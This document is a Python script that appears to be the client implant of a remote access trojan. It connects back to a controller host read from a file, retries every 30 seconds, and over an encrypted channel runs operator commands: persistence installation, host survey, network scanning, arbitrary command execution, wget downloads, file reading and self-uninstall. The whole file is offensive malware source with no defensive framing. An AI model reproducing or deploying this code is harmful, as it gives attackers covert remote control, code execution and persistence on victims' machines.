#!/usr/bin/env python
import socket
import subprocess
import sys
import time
from core import *
dfile = open('nullbyte00.dat')
dfiled = dfile.read()
HOST = dfiled
PORT = YYYY
CONN_TIMEOUT = 30
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)
def client_loop(conn, dhkey):
    while True:
        results = ''

        data = crypto.decrypt(conn.recv(4096), dhkey)

        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            sys.exit(0)

        elif cmd == 'uninstall':
            conn.close()
            toolkit.uninstall(PLAT)

        elif cmd == 'killall':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'rekey':
            dhkey = crypto.diffiehellman(conn)

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action, PLAT)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(PLAT)

        elif cmd == 'pwd':
            results = toolkit.pwd(PLAT)

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results +='{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def main():
    while True:
        conn = socket.socket()

        try:

            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        dhkey = crypto.diffiehellman(conn)


        try:
            client_loop(conn, dhkey)
        except:
            pass


if __name__ == '__main__':
    main()
